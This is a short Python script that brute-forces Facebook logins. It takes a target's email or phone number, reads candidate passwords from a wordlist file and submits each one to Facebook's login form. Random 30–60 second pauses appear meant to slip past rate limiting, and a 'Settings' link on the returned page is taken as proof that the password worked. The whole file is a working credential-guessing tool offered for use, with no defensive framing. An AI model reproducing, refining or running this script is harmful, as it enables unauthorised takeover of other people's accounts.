import mechanicalsoup
import random
import time


email = str(input("email or id or phnumber : "))
password = []
op = open("x.txt","r")
browser = mechanicalsoup.Browser()
login_page = browser.get("https://www.facebook.com/login.php?login_attempt=1&lwv=100")
login_form = login_page.soup.select("#login_form")[0]
for i in op.readlines():
   randomtime = random.randrange(30,60)
   print("                          sleep {}".format(str(randomtime)))
   time.sleep(int(randomtime))
   i = i.rstrip("\n")
   login_form.select("#email")[0]['value'] = email
   login_form.select("#pass")[0]['value'] = i
   page2 = browser.submit(login_form, login_page.url)
   print("                          try:: "+i)
   for h in page2.soup.findAll("a"):
      h = h.text
      #print(h)
      if h == "إعدادات الحساب" or h == "Settings":
           print("                          ###### the password is ::: >> "+i)
           password.append(i)
           break;
   if len(password) == 1:
      break;
   else:
      continue
   
